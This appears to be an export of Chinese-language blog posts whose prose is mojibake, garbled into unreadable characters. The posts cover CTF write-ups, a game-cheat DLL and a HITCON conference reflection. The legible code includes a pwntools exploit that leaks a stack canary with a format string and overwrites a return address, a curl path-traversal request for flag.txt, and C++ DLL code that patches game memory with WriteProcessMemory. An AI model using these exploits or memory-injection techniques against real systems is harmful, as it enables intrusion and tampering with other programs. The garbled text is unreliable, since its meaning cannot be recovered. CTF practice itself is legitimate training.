#\ré€™å…©é¡Œéƒ½æ˜¯æœ‰é–‹canaryæª¢æ¸¬æ˜¯å¦æœ‰overflowçš„ï¼Œé€™é‚Šå…ˆè¬›run3\né€™é¡ŒåŸ·è¡Œå¾Œæœƒè®“ä½ è¼¸å…¥å…©æ¬¡ï¼Œæ¯æ¬¡è¼¸å…¥å¾Œéƒ½æœƒechoå›å»\nç”±æ–¼æ²’æœ‰ç‰¹åˆ¥æª¢æ¸¬ï¼Œå› æ­¤é€™é‚Šç¬¬ä¸€æ¬¡è¼¸å…¥å¯ä»¥è¼¸å…¥\u0026amp;13$pä¾†leakå‡ºcanaryçš„å€¼\nå› æ­¤æœ€å¾Œpayloadå°±è®Šæˆå…ˆå‚³é€åˆ°èƒ½è¦†è“‹çš„éƒ¨åˆ†ï¼Œæ¥è‘—é€å…¥canaryçš„å€¼ï¼Œé€å…¥p64(0)å°é½Šï¼Œæœ€å¾Œè¼¸å…¥win function\né€™é‚Šç›´æ¥è·³åˆ°win funcçš„é ­æœƒæœ‰å•é¡Œï¼Œæœ€å°‘è¦è·³åˆ°win+0x5ä»¥å¾Œæ‰å¯ä»¥æ­£å¸¸é–‹shell\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway3\u0026#34;) if args.GDB: gdb.attach(r) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; sla(b\u0026#34;?\\n\u0026#34;, b\u0026#34;%13$p\u0026#34;) canary = int(r.readline().decode(), 16) win = 0x4011D6 + 0x5 payload= cyclic(40) payload+=p64(canary) payload += p64(0) payload+=p64(win) sl(payload) r.interactive() å¦ä¸€é¡Œcaluå‰‡æ˜¯ä¸€å€‹è¨ˆç®—æ©Ÿï¼Œä¸€é–‹å§‹è®“ä½ è¼¸å…¥å…©å€‹æ•¸å­—åšé‹ç®—ï¼Œæœ€å¾Œè®“ä½ è¼¸å…¥ä»»æ„æ±è¥¿\né€™é‚Šå…ˆé€éåœ¨ç¬¬ä¸€æ¬¡è¼¸å…¥1*piï¼Œæ¥è‘—ä»–æœƒå•ä½ piè¦å¹¾ä½æ•¸ï¼Œè¼¸å…¥100016ï¼Œå¾Œé¢[-11:-3]å³ç‚ºcanaryçš„å…§å®¹\næ¥ä¸‹ä¾†å°±å’Œä¸Šé¢run3å·®ä¸å¤šã„Œ\nåƒè€ƒwrite up\npwn / no_handouts #\rä»¥ç‚ºæ˜¯ret2libc çµæœæ˜¯è¦ä¸²ROPè‡ªå·±å¯«shellå»è®€flag.txt\nå“ˆå“ˆæˆ‘å›å»ä¹–ä¹–è¤‡ç¿’ROPé‚£å ‚èª²\u0026hellip;\nweb / SSFS #\ræœ¬ä¾†ä»¥ç‚ºæ˜¯web shellçµæœåªæ˜¯LFIå“ˆå“ˆ\nç›´æ¥åœ¨ç¶²ç«™æœå°‹/../../flag.txtï¼Œå‰é¢../çš„éƒ¨åˆ†æœƒè¢«è‡ªå‹•å¯©ç•¥ï¼Œå› æ­¤é€écurl \u0026ndash;path-as-isä¾†é¿å…éæ¿¾æ‰../\ncurl --path-as-is https://ssfs.challs.pwnoh.io/download/../../flag.txt forensics / couch potatoã€wreckã€duck-pics #\rcouch potato ä¸€å€‹wavæª”ï¼Œé€é\rSSTV Decoderè½‰æˆpngå°±æœ‰flagäº† wreck ä¸€å€‹elfæª”æ¡ˆï¼Œstrings grep flagä»–æœƒçœ‹åˆ°æœ‰flag.jpgçš„æ±è¥¿ï¼Œé€ébinwalkæŠŠä»–å…§å®¹dumpä¸‹ä¾†\nbinwalk -e --dd=\u0026#39;.*\u0026#39; dump é€²å…¥è³‡æ–™å¤¾å¾Œ\nfile * |grep JPEP xdg-open æª”æ¡ˆç·¨è™Ÿ duck-pics pcapé¡Œç›® æŸ¥çœ‹å…§å®¹çŒœæ¸¬æ˜¯è·Ÿéµç›¤é‹ä½œæœ‰é—œï¼Œå…ˆæŠŠå…§å®¹dumpä¸‹ä¾†ï¼Œåœ¨é€é\rå·¥å…·è§£å¯†\ntshark -r capture.pcapng -Y \u0026#39;usb.src == \u0026#34;1.1.1\u0026#34;\u0026#39; -T fields -e usbhid.data |sed \u0026#39;s/../:\u0026amp;/g2\u0026#39; \u0026gt; output python3 convert.py output åƒè€ƒwrite up\nç¸½çµ #\ré€™æ¬¡å­¸åˆ°äº†æ»¿å¤šæ±è¥¿ï¼Œä¸€äº›å·¥å…·çš„ä½¿ç”¨ï¼Œé‚„æœ‰ä¸€äº›ä¹‹å‰å­¸åˆ°çš„æŠ€è¡“çš„å¯¦éš›æ‡‰ç”¨\nå¾Œé¢çœ‹åˆ¥äººçš„wuä¹Ÿå­¸äº†æ»¿å¤šæ±è¥¿(ä¸»è¦æ˜¯canaryçš„éƒ¨åˆ†å•¦)\nç„¶å¾Œæˆ‘é€™æ¬¡çš„æ’ç‰ˆæˆ‘è¦ºå¾—æœ‰å¤ é†œ ä¸‹ç¦®æ‹œæ”¹é€²\næœ€å¾Œéš¨ä¾¿æ”¾ä¸€å¥\næ™‚ã‚ˆæ­¢ã¾ã‚Œã€ãŠã¾ãˆã¯ç¾ã—ã„\n","date":"30 September 2024","externalUrl":null,"permalink":"/posts/007_weeklyctf02/","section":"Posts","summary":"é€™æ¬¡æ‰“çš„æ˜¯BuckeyeCTF 2024","title":"æ¯å‘¨CTFè¨ˆç•«02","type":"posts"},{"content":"\rè€¶å…¶å¯¦æˆ‘é‚„æœ‰åœ¨ç‰›è‚‰æ¹¯è®€æ›¸æœƒç™¼è¡¨é€™å€‹\nå…¶å¯¦æ»¿å»¢çš„ å°ä¸èµ·å¤§å®¶ã€‚\rå‹•æ©Ÿ #\ré€™æ¬¡çš„è¢«å®³è€…æ˜¯ SupermarketTogether\né€™æ˜¯ä¸€å€‹æ¨¡æ“¬è¶…å¸‚ç¶“ç‡Ÿçš„éŠæˆ²ï¼Œä½†é€™æ¬¡çš„å¤–æ›è·Ÿé€™éƒ¨åˆ†å®Œå…¨æ²’é—œä¿‚\nç°¡å–®ä¾†è¬›åœ¨é€™å€‹éŠæˆ²å…§æœ‰ä¸€å€‹æˆ¿é–“ï¼Œæ˜¯æ­£å¸¸éŠç©é€²ä¸å»ï¼Œé–€å£æœ‰ç©ºæ°£ç‰†å µä½\nç„¶å¾Œæˆ¿é–“å…§æœ‰ä¸€éš»å¤§è±¡ï¼Œä¸‹åœ–å°±æ˜¯æˆ¿é–“å…§çš„ç•«é¢\nç¸½ä¹‹æˆ‘çš„ç›®çš„å°±æ˜¯è¦é€²å»æˆ¿é–“å…§ï¼Œå°å°±æ˜¯é‚£éº¼å»¢ã€‚\né€²å…¥æˆ¿é–“å…§ #\ræ­£å¸¸æ–¹æ³•(? #\rä¸€é–‹å§‹å…ˆå»çœ‹äº†ä¸€ä¸‹æ­£å¸¸è©²å¦‚ä½•é€ééŠæˆ²å…§çš„bugå¡é€²å»æˆ¿é–“å…§\nç°¡å–®ä¾†è¬›å°±æ˜¯é€éunityå…¶ä¸­çš„3Dç‰©ä»¶ä¸æ–·é‡ç–Šæœƒç™¼ç”Ÿç©¿æ¨¡çš„bugä¾†å¡å…¥æˆ¿é–“å…§ å…·é«”å¦‚ä½•é€²å…¥çš„è©±å¯ä»¥æŸ¥çœ‹ä¸‹é¢é€™å€‹å½±ç‰‡çš„7:40çš„éƒ¨åˆ† https://www.bilibili.com/video/BV1XXeneoEcJ/\né€éCheatEngine #\rCheatEngine(ä»¥ä¸‹ç°¡ç¨±CE)ï¼Œæ˜¯ä¸€å€‹å¸¸ç”¨ä¾†æ”¹éŠæˆ²å…§åƒæ•¸çš„å¤–æ›å·¥å…·ï¼Œé€™é‚Šä¸ç‰¹åˆ¥ä»‹ç´¹\nåƒè€ƒå½±ç‰‡çš„è©±å¯ä»¥çœ‹ä¸‹åˆ—å…©å€‹ï¼Œä¸Šé¢æˆå¤§è³‡å®‰ç¤¾çš„ç¤¾èª²ä¸»è¦æ˜¯ä»‹ç´¹CEçš„åŸºç¤ä½¿ç”¨ï¼Œä¸‹é¢çš„å‰‡æ˜¯é€éCEä¾†æ‰¾åº§æ¨™ï¼Œå»ºè­°æ­é…é£Ÿç”¨ å°æé†’ï¼šæ‰¾åº§æ¨™æ™‚è¨˜å¾—æŠŠé¡å‹æ”¹æˆfloatæ¯”è¼ƒå¥½æ‰¾ é‚£ç¸½ä¹‹é€éä¸æ–·æœå°‹å¾Œå°±å¯ä»¥æ‰¾åˆ°æ§åˆ¶xåº§æ¨™çš„éƒ¨åˆ†äº†ï¼Œæ¥è‘—æŠŠåƒæ•¸æ”¹æˆ2.5å³å¯é€²å…¥æˆ¿é–“å…§\næ­å–œä½ ä¹Ÿæ˜¯å¾ˆé…·çš„äººäº† å•ªå˜°å•ªå˜°å•ªå˜°\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œå†æ‰¾åƒæ•¸çš„æ™‚å€™æœ‰ç™¼ç¾å…©å€‹æ§åˆ¶åº§æ¨™çš„åƒæ•¸\nä½†å…¶ä¸­ä¸€å€‹æ”¹å€¼å¾Œä¸æœƒé¦¬ä¸Šç”Ÿæ•ˆï¼Œå¦ä¸€å€‹å‰‡æœƒ\næœ€å¾Œæ¨æ–·æ˜¯ï¼Œå…¶ä¸­ä¸€å€‹æ˜¯ä¸»è¦æ§åˆ¶çš„ï¼Œå¦ä¸€å€‹å‰‡æœ‰é»åƒæ˜¯é™„å±¬çš„æ„Ÿè¦º(?\nDLL #\rä¾†åˆ°é€™æ¬¡çš„é‡é»äº†ï¼Œå‰é¢å–®ç´”é€éCEä¾†æ”¹åƒæ•¸çš„éƒ¨åˆ†ä¸è«–æ˜¯é€Ÿåº¦é‚„æ˜¯ä»€éº¼ï¼Œç¼ºé»å¤ªå¤šäº†\nå› æ­¤é€™é‚Šæˆ‘å€‘å°±ä¾†æŠŠå®ƒå¯«æˆDLLçš„å½¢å¼ï¼Œé€éDLL injectionä¾†æ³¨å…¥æˆ‘å€‘å¯«çš„å£å£çš„æ±è¥¿\nä»¥æ­¤ä¾†é”åˆ°æŒ‰ä¸‹ç‰¹å®šæŒ‰éµå°±å¯ä»¥ç¬ç§»é€²å…¥æˆ¿é–“å…§çš„åŠŸèƒ½\nå…ˆä¸Ÿä¸€ä¸‹github è£¡é¢æœ‰é€™æ¬¡çš„åŸç¢¼åŠDLL Betan423/SupermarkerTogether-dll\råœ¨B33F50UPè®€æ›¸æœƒä¸Šåˆ†äº«çš„å¤–æ›åŸå§‹æª”\rC\u0026#43;\u0026#43; 0\r0\ré‡åˆ°å•é¡Œ #\ræœ¬æ¬¡é‡åˆ°æœ€å¤§çš„å•é¡Œæ˜¯ï¼Œæ¯æ¬¡é–‹å•Ÿæ‰€ä½”ç”¨çš„çš„addresséƒ½ä¸åŒï¼Œå› æ­¤ä¹Ÿå°±ä¸èƒ½å–®ç´”é€éä¸€å€‹å›ºå®šä¿®æ”¹æŸè™•addressçš„DLLä¾†æ‰“å¤©ä¸‹\nè€Œæˆ‘æœ€åˆçš„æƒ³æ³•æ˜¯ï¼Œæœƒä¸æœƒä»–åªæ˜¯base addressä¸åŒï¼Œè€Œå…¶ä»–å½¼æ­¤åƒæ•¸é–“çš„ç›¸å°ä½ç½®å‰‡æ˜¯å›ºå®šçš„\nå¦‚æœåƒæ•¸é–“çš„ç›¸å°è·é›¢æ˜¯å›ºå®šçš„ï¼Œæˆ‘å€‘ä¹Ÿå°±èƒ½é€éå…ˆå»å°‹æ‰¾ä¸€å€‹å¥½æ‰¾ä¸€é»çš„å€¼(åƒæ˜¯é‡‘éŒ¢)ï¼Œæ¥è‘—å†é€éä»–è·Ÿxåº§æ¨™å½¼æ­¤é–“çš„addresså·®å€¼ï¼Œå°±èƒ½å¤ å¿«é€Ÿæ‰¾å‡ºxåº§æ¨™çš„addressäº†\nä½†åœ¨é‡è¤‡æ‰¾äº†è¨±å¤šæ¬¡é‡‘éŒ¢èˆ‡xåº§æ¨™çš„addressï¼Œç™¼ç¾ä»–å€‘å½¼æ­¤é–“çš„å·®å€¼æ˜¯æ²’æœ‰ç›¸é—œçš„qq\nmoney place å·®å€¼ 12455A43E80 1222316B88C 2 328D 85F4 1CD5CB93BE0 1CB32953D08 2 2A23 FED8 1D652C40BE0 1D402B92B6C 2 500A E074 28FE89F9E80 28D82C0752C 2 65DF 2954 1AFDC3D4940 1ADA2B77B98 2 3985 CDA8 å› æ­¤æœ€å¾Œçš„æ–¹æ¡ˆå°±é‚„æ˜¯è¦å…ˆåœ¨é–‹å§‹æ™‚å»å°‹æ‰¾xåº§æ¨™çš„addressï¼Œæ¥è‘—å†é€éè¼¸å…¥é€²å»DLLå…§ï¼Œä¾†æ”¹è®Šå…¶ä¸­é è¨­çš„addresså€¼(é è¨­æ˜¯å¯«0x0400000 ä½†ç•¶ç„¶ä¸å¯èƒ½æ˜¯é€™é‚Š)\nDLLèªªæ˜ #\ræœ€çµ‚DLLçš„æ­¥é©Ÿå°±æ˜¯å…ˆé€éè®“ç”¨æˆ¶æŒ‰ä¸‹iä¾†å‡ºç¾è¼¸å…¥addressçš„å°è©±æ¡†ï¼Œæ¥è‘—ä¿®æ”¹å¾Œå°±èƒ½é€éæŒ‰ä¸‹oä¾†ç¬ç§»é€²æˆ¿é–“å…§ã€‚æŒ‰ä¸‹lä¾†é›¢é–‹æˆ¿é–“å…§\né€™é‚Šå¯ä»¥æ­é…ä¸Šé¢githubå…§çš„final.cppåŸå§‹ç¢¼ä¸€èµ·çœ‹ï¼Œé€™é‚Šå°±ä¸ç‰¹åˆ¥è²¼æ•´æ®µåŸå§‹ç¢¼äº†\nå®šç¾©é¡å‹ #\rå‰›å‰›æœ‰æåˆ°æˆ‘å€‘æ˜¯å¤ éfloatä¾†æ”¹æœƒæ¯”è¼ƒæ–¹ä¾¿ï¼Œå› æ­¤åœ¨æœ€é–‹é ­çš„åœ°æ–¹å…ˆå®šç¾©å¥½\n#define TYPE float å®šç¾©åƒæ•¸ #\råœ¨ä¸Šé¢å…ˆå®£å‘Šå¥½åƒæ•¸ï¼Œåœ¨æœ€å¾Œçš„æ™‚å€™çµ¦åƒæ•¸é™„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘ç¬ç§»å¾Œè¦çš„åº§æ¨™æ˜¯å¤šå°‘\nstruct Params { TYPE x_go; // ä½ç½® TYPE y_go; TYPE x_back; TYPE y_back; }; ... g_params.x_go = 2.5f; g_params.y_go = 2.8f; g_params.x_back = 2.0f; g_params.y_back = 2.8f; å–å¾—åœ°å€ #\ræœƒè·³å‡ºå…©å€‹å°è©±æ¡†ï¼Œä¸€å€‹æ˜¯è®“ä½ è¼¸å…¥addressçš„ï¼Œä¸€é–‹å§‹æœƒé¡¯ç¤ºè«‹è¼¸å…¥æ–°çš„è¨˜æ†¶é«”ä½å€ï¼ˆåå…­é€²ä½ï¼‰ï¼›å¦ä¸€å€‹å‰‡æ˜¯å–®ç´”ç¢ºèªæ¡†ï¼Œè¼¸å…¥å¥½å¾ŒæŒ‰ä¸‹å»å³å¯ä¿®æ”¹\nDWORD_PTR GetUserInputAddress() { //è¼¸å…¥éƒ¨åˆ† HWND hwndInput = CreateWindowEx( 0, L\u0026#34;EDIT\u0026#34;, NULL, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_VISIBLE | ES_LEFT, CW_USEDEFAULT, CW_USEDEFAULT, 300, 100, NULL, NULL, GetModuleHandle(NULL), NULL ); SetWindowText(hwndInput, L\u0026#34;è«‹è¼¸å…¥æ–°çš„è¨˜æ†¶é«”ä½å€ï¼ˆåå…­é€²ä½ï¼‰\u0026#34;); ShowWindow(hwndInput, SW_SHOW); UpdateWindow(hwndInput); char input[17] = { 0 }; // ç¢ºèªéƒ¨åˆ† if (MessageBox(NULL, L\u0026#34;è«‹è¼¸å…¥æ–°çš„è¨˜æ†¶é«”ä½å€ï¼ˆåå…­é€²ä½ï¼‰ä¸¦æŒ‰ä¸‹ç¢ºèª\u0026#34;, L\u0026#34;è¼¸å…¥åœ°å€\u0026#34;, MB_OKCANCEL) == IDOK) { GetWindowTextA(hwndInput, input, sizeof(input)); DestroyWindow(hwndInput); return strtoull(input, NULL, 16); // å°‡è¼¸å…¥çš„åå…­é€²ä½å­—ç¬¦ä¸²è½‰æ›ç‚ºåœ°å€ } // å‡ºéŒ¯è¿”å›åŸåœ°å€ DestroyWindow(hwndInput); return g_x_address; } ä¿®æ”¹åƒæ•¸ #\ré€™é‚Šå°±æ˜¯çµåˆä¸Šé¢å…©å€‹å®šç¾©å¥½çš„addressä»¥åŠå…ˆå‰è¨­å®šçš„åƒæ•¸ä¾†ä¿®æ”¹å…§å­˜çš„å€¼äº†\nif (GetAsyncKeyState(\u0026#39;O\u0026#39;) \u0026amp; 0x8000) // 0x8000 è¡¨ç¤ºè©²éµè¢«æŒ‰ä¸‹ { WriteProcessMemory(hProcess, (LPVOID)(g_x_address), \u0026amp;g_params.x_go, sizeof(TYPE), NULL); WriteProcessMemory(hProcess, (LPVOID)(g_x_address - 0x10), \u0026amp;g_params.y_go, sizeof(TYPE), NULL); } if (GetAsyncKeyState(\u0026#39;L\u0026#39;) \u0026amp; 0x8000) // 0x8000 è¡¨ç¤ºè©²éµè¢«æŒ‰ä¸‹ { WriteProcessMemory(hProcess, (LPVOID)(g_x_address), \u0026amp;g_params.x_back, sizeof(TYPE), NULL); WriteProcessMemory(hProcess, (LPVOID)(g_x_address - 0x10), \u0026amp;g_params.y_back, sizeof(TYPE), NULL); } ç¸½çµ #\rè€¶å¤§æ¦‚å°±é€™æ¨£ï¼ŒDLLå¤–æ›çš„è¡ä¼¸æ‡‰ç”¨é‚„æœ‰å¾ˆå¤šï¼Œçµ•å°ä¸æœƒåªæœ‰å–®ç´”é€™æ¨£æ”¹åƒæ•¸é€™éº¼ç°¡å–®ï¼Œä½†çª©ä¸æœƒï¼Œåƒæ˜¯ä¹Ÿå¯ä»¥é€éæ›å€‹hookä¹‹é¡çš„ä¾†ä¿®æ”¹åŸæœ¬çš„é‹ä½œæ–¹æ³•\u0026hellip; ä»¥å¾Œå¦‚æœå­¸åˆ°çš„è©±æœƒå†ä¾†å¯«å¸ƒæ‹‰æ ¼çš„ å¤§æ¦‚\n","date":"26 September 2024","externalUrl":null,"permalink":"/posts/006_supermarketdll/","section":"Posts","summary":"æŠŠCEæ”¹åƒæ•¸éƒ¨åˆ†å¯«æˆdllä¾†æ³¨å…¥","title":"è¶…å¸‚ä¸€èµ·ç¬ç§»DLL","type":"posts"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/%E8%B3%87%E5%AE%89/","section":"Tags","summary":"","title":"è³‡å®‰","type":"tags"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/%E9%81%8A%E6%88%B2%E5%A4%96%E6%8E%9B/","section":"Tags","summary":"","title":"éŠæˆ²å¤–æ›","type":"tags"},{"content":"\rå‡è£è‡ªå·±åœ¨åƒåŠ éµäººè³½\rå‰è¨€ #\ré€™æ¬¡åƒåŠ çš„æ˜¯ IERAE CTF ï¼Œå…¶å¯¦æœ¬ä¾†æ˜¯æœ‰å ±åä¸‰å ´CTFçš„ï¼Œä½†æœ€å¾Œåªæœ‰é€™å ´è§£å‡ºæ¯”è¼ƒå¤šé¡Œ(ä½†ä¹Ÿæ²’å¤šå°‘)ï¼Œæ‰€ä»¥å°±å°ˆæ³¨å¯«é€™å€‹äº†\nä¹‹å¾Œçš„æ­¥èª¿æ‡‰è©²ä¹Ÿéƒ½æœƒå·®ä¸å¤šæ˜¯é€™æ¨£ï¼Œå…ˆå ±å2~3å€‹CTFï¼Œæœ€å¾Œå†çœ‹è¦ä¸»æ‰“å“¥å“ªå€‹\næœ¬æ¬¡æ’å 106/224 è§£å‡ºå››é¡Œqq\né¡Œç›® #\rWelcome #\rflagåœ¨DCå…§ï¼Œå°±å–®ç´”é€²å»æ‰¾ :)\nOMG #\ré¡å‹: web\nä¸€å€‹ç¶²é ï¼Œç„¶å¾Œåªè¦æŒ‰è¿”å›å‰ä¸€é 33æ¬¡å°±å¯ä»¥äº†\nderangement #\ré¡å‹: crypto\næœ‰ä¸€å€‹éš¨æ©Ÿç”¢ç”Ÿçš„16å€‹å­—ç¬¦ï¼Œç„¶å¾Œè£¡é¢æœƒä¸æ–·éš¨æ©Ÿæ’åˆ—ä»–å€‘çš„é †åºï¼Œç›®æ¨™æ˜¯æ‰¾å‡ºæ­£ç¢ºçš„é †åº\næŸ¥çœ‹åŠ å¯†æ³•å¾Œæœƒç™¼ç¾å­—ç¬¦ä¸æœƒå‡ºç¾åœ¨æœ¬ä¾†æ­£ç¢ºçš„åœ°æ–¹ï¼Œå› æ­¤åªè¦å¤šè·‘å¹¾æ¬¡å°±å¯ä»¥é †åˆ©å¾—å‡ºæœ¬ä¾†çš„é †åºäº†\næœ¬ä¾†æ˜¯æƒ³ç¡¬æ“çš„ï¼Œä½†æƒ³èªªé€™æ¨£æ²’ç”šéº¼ç”¨é‚„æ˜¯é€épwntoolå¯«å¥½äº†\nfrom pwn import * # é–‹å•Ÿç¨‹åº p = remote(\u0026#39;104.199.135.28\u0026#39;, 55555) # ç”¨ä¾†å­˜å„²æ‰€æœ‰ç²å¾—çš„æç¤º hints = [] ans=\u0026#39;\u0026#39; p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;,\u0026#39;1\u0026#39;) response = p.recvuntil(\u0026#39;hint: \u0026#39;).decode() world = p.recvline().decode().strip() a = world b = world c = world d = world e = world f = world g = world h = world i = world j = world k = world l = world m = world n = world o = world time =0 try: while time\u0026lt;100: # ç™¼é€ \u0026#34;1\u0026#34; ä¾†ç²å–æç¤º p.sendline(\u0026#39;1\u0026#39;) # æ¥æ”¶ä¸¦è§£ææç¤º response = p.recvuntil(\u0026#39;hint: \u0026#39;).decode() hint = p.recvline().decode().strip() hints.append(hint) print(f\u0026#39;Received hint: {hint}\u0026#39;) # å¯ä»¥åœ¨é€™è£¡æ·»åŠ é‚è¼¯ä¾†åˆ†æ hints ä¸¦æ¨æ¸¬åŸå§‹é­”æ³•è© if hint[0] in a: a = a.replace(hint[0], \u0026#34;\u0026#34;) if hint[1] in b: b = b.replace(hint[1], \u0026#34;\u0026#34;) if hint[2] in c: c = c.replace(hint[2], \u0026#34;\u0026#34;) if hint[3] in d: d = d.replace(hint[3], \u0026#34;\u0026#34;) if hint[4] in e: e = e.replace(hint[4], \u0026#34;\u0026#34;) if hint[5] in f: f = f.replace(hint[5], \u0026#34;\u0026#34;) if hint[6] in g: g = g.replace(hint[6], \u0026#34;\u0026#34;) if hint[7] in h: h = h.replace(hint[7], \u0026#34;\u0026#34;) if hint[8] in i: i = i.replace(hint[8], \u0026#34;\u0026#34;) if hint[9] in j: j = j.replace(hint[9], \u0026#34;\u0026#34;) if hint[10] in k: k = k.replace(hint[10], \u0026#34;\u0026#34;) if hint[11] in l: l = l.replace(hint[11], \u0026#34;\u0026#34;) if hint[12] in m: m = m.replace(hint[12], \u0026#34;\u0026#34;) if hint[13] in n: n = n.replace(hint[13], \u0026#34;\u0026#34;) if hint[14] in o: o = o.replace(hint[14], \u0026#34;\u0026#34;) ans=a+b+c+d+e+f+g+h+i+j+k+l+m+n+o print(ans) if(len(ans)==15): p.sendline(\u0026#39;2\u0026#39;) p.sendline(ans) p.interactive() except Exception as e: print(f\u0026#39;Connection closed or error occurred: {e}\u0026#39;) finally: p.close() Assignment #\ré¡å‹: rev\né€éIDAæ‰“é–‹å¯ä»¥çœ‹åˆ°é †åºè¢«æ‰“äº‚çš„flag\nä½†æ‰“é–‹F5å¾Œå°±å¯ä»¥çœ‹åˆ°æ’åˆ—å¥½é †åºçš„flagäº† ç¸½çµ #\ré€™æ¬¡å…¶å¯¦éƒ½åªæœ‰è§£å‡ºæ°´é¡Œå‡ºä¾†w\nä½†ç•¢ç«Ÿæ‰ç¬¬ä¸€å‘¨\nå…¶å¯¦æˆ‘ä¹Ÿä¸çŸ¥é“é€™æ¨£æœƒä¸æœƒæœ‰æ•ˆæœ ä½†å°±å…ˆå˜—è©¦çœ‹çœ‹\nä¹‹å¾Œæœƒå†è£œå……ä¸€äº›è‡ªå·±æ²’è§£å‡ºä¾†çš„é¡Œç›®ï¼Œä½†æ˜¯å»æŸ¥çœ‹åˆ¥äººwuè§£å‡ºä¾†çš„å…§å®¹\næœ€å¾Œåˆ†äº«ä¸€å€‹é€™æ¬¡åœ¨æ¯”è³½çµæŸå¾Œçœ‹åˆ°çš„\nåœ¨è¬›é€™æ¬¡æ¯”è³½cryptoé¡å‹çš„é¡Œç›®ï¼Œé »é“å…§å®¹ä¹Ÿæœ‰å…¶ä»–è³‡å®‰ç›¸é—œçš„å½±ç‰‡\nä¸éæ˜¯æ—¥æ–‡çš„VT\n","date":"23 September 2024","externalUrl":null,"permalink":"/posts/005_weeklyctf01/","section":"Posts","summary":"ä½ èªªçš„å°ä½†é€™å°±æ˜¯CTF","title":"æ¯å‘¨CTFè¨ˆç•«01","type":"posts"},{"content":"\rä»Šå¹´æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åƒåŠ HITCONï¼Œè€Œæˆ‘æœ‰å¹¸èƒ½é †åˆ©éŒ„å–å­¸ç”Ÿå…è²»æ–¹æ¡ˆï¼Œé€™é‚Šå†æ¬¡æ„Ÿè¬HITCONå®˜æ–¹\ræ„Ÿæƒ³ #\ré€™é‚Šå…ˆæ”¹ä¸€ä¸‹é †åºï¼Œå…ˆè¬›ä¸€ä¸‹é€™æ¬¡æ´»å‹•çš„æ„Ÿæƒ³ï¼Œå°æ–¼æœ¬æ´»å‹•æœ‰èˆˆè¶£çš„è©±å¯ä»¥å†å»é–±è®€ä¸‹é¢çš„ç›¸é—œä»‹ç´¹\né€™æ¬¡çš„badgeé›»è·¯æ¿ã€å„ç¨®çš„æ”¤ä½æ´»å‹•ä¹Ÿéƒ½å¾ˆæœ‰è¶£ï¼Œè­°ç¨‹ä¹Ÿæ˜¯æœ‰è®“æˆ‘äº†è§£äº†è¨±å¤šæ–°æ±è¥¿ï¼Œè€Œä¸”å…è²»æ—©é¤è·Ÿé»å¿ƒä¹Ÿå¾ˆéƒ½å¥½åƒğŸ‘‰ğŸ‘ˆ å› ç‚ºè‡ªå·±é€™æ¬¡ä¸»è¦æ˜¯æœ‰åœ¨å”åŠ©NISRAæ“ºæ”¤ï¼Œå› æ­¤å…¶å¯¦é€™æ¬¡ä¸»è¦æ˜¯å¾…åœ¨ç¤¾ç¾¤æ”¤ä½ï¼Œä¸­é–“ä¹Ÿæœ‰å»è½äº†å¹¾å ´è‡ªå·±æ„Ÿèˆˆè¶£çš„è­°ç¨‹ é€™æ¬¡æ´»å‹•è®“æˆ‘æ”¶ç©«è¨±å¤šï¼Œç„¡è«–æ˜¯badgeçš„éŠæˆ²é—–é—œã€å„ç¨®æ”¤ä½æ´»å‹•ã€ç›¸é—œè­°ç¨‹ç­‰ï¼Œéƒ½è®“æˆ‘èªè­˜äº†è¨±å¤šå…¨æ–°çš„äººï¼Œå·²ç¶“å­¸ç¿’åˆ°äº†è¨±å¤šè‡ªå·±ä»¥å‰å¾æœªæ¥è§¸éçš„æ–¹é¢\næˆ‘èªç‚ºHITCON CMTæ˜¯ååˆ†é©åˆä¸è«–ä½ æ˜¯å‰›å…¥é–€è³‡å®‰ï¼Œåˆæˆ–æ˜¯å·²ç¶“å°æ–¼è³‡å®‰æœ‰ä¸€å®šçš„äº†è§£éƒ½å¯ä»¥ä¾†åƒåŠ \nè³‡å®‰æ–°æ‰‹ #\rå°æ–¼å‰›å…¥é–€çš„äººä¾†è¬›ï¼Œåœ¨é€™é‚Šèƒ½å¤ å»è½ä¸€äº›è‡ªå·±æœ‰èˆˆè¶£çš„è­°ç¨‹ï¼Œäº†è§£è©²æ–¹é¢çš„æœªä¾†ç™¼å±•ã€ç›¸é—œæŠ€è¡“ç­‰ï¼Œåˆæˆ–æ˜¯å¯ä»¥åˆ°è™•èªè­˜ä¸€å †å¤§ä½¬ï¼Œçµäº¤ä¸€äº›æ–°æœ‹å‹ï¼Œè®“ä½ 